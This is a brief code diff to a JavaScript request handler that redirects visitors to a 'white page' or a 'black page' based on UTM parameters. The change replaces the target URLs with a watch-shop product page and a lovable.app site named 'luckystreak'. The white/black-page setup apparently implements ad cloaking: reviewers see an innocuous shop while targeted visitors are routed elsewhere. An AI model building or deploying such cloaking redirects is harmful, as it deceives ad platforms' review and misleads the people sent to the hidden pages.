@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.hirschstraps.com/products/hirsch-duke-alligator-embossed-leather-watch-strap-black";
-    const blackPageURL = "https://streammagic.lovable.app/";
+    const whitePageURL = "https://www.watchheaven.pk/products/blush-radiance";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
